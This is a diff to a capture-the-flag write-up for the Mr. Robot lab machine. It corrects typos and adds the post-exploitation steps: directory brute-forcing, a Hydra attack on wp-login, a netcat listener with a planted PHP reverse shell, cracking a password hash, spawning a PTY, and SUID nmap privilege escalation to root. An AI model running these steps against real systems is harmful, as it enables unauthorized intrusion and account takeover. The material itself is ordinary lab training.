@@ -56,13 +56,13 @@ Then run the following command.
 
 `gobuster -u 'http://MACHINE_IP' -w any_directory_wordlist.txt -o gobusteroutput.txt `
 
-ONce gobustter is done finding subdomains, we can check which ones have a 200 response:
+Once gobuster is done finding subdomains, we can check which ones have a 200 response:
 
 `cat gobusteroutput.txt | grep 200`
 
 ![grep 200 screenshot](grep200.png)
 
-At this point, focus shifts towards the */wp-login* page, wehre we laungh a username and password
+At this point, focus shifts towards the */wp-login* page, where we launch a username and password
 brute force attack using our fsocity.dic wordlist and Hydra (https://github.com/vanhauser-thc/thc-hydra)
 
 The command below was used to brute-force the username(USER = Elliot):
@@ -83,7 +83,7 @@ To get the shell we start listening on port 53 with netcat:
 
 `sudo rlwrap nc -lvnp 53`
 
-then get a reverse shell from wherever you want, the one from the thm walkthrough was this
+then get a reverse shell from wherever you want, the one from the the walkthrough was this
 one (https://github.com/pentestmonkey/php-reverse-shell). By modifying a php file for a certain them with
 the reverse php shell we get the connection. Load that file on the browser, in this case the URL:
 
@@ -92,4 +92,37 @@ the reverse php shell we get the connection. Load that file on the browser, in t
 We now go back to the terminal in which we are listening for incoming connections on port 53
 And we have a shell
 
-Check available users on the shell:  `ls /home`
+![shell](screenshots/whoami.png)
+
+Check for users on the shell:  `ls /home` , then check their home directories for anything
+useful. In this case the second key is in  robot user's home dir, but we cant read it until
+we escalate priviledges. There is, however, a backup of robot's password stored and legible.
+So we read it
+
+![users](screenshots/lsa.png)
+
+Then we use crackstation to check the hash, and the password is: `abcdefghijklmnopqrstuvwxyz`\
+
+To login as robot using this shell, first we need to make it interactive, this is done with the
+following command and the result can be seen in the screenshot below:
+
+`python -c 'import pty;pty.spawn("/bin/bash")'`
+
+![interactive shell](screenshots/interactive.png)
+
+Once logged in as robot we can read the second key and escalate privileges to root.
+command: `find / -perm +6000 2>/dev/null | grep '/bin/' ` will find binaries with the root binary .
+ The resulting binaries are shown below:
+
+![binaries](screenshots/binaries.png)
+
+The `/usr/local/bin/nmap` binary can be used to gain root access.
+Additional information can be found here: https://gtfobins.github.io/gtfobins/nmap/
+
+We run the binary and the reccomended commands to escalate privilege:
+`sudo nmap --interactive
+nmap> !sh`
+
+And we are now root... that's it
+
+![key 3](key3.png)
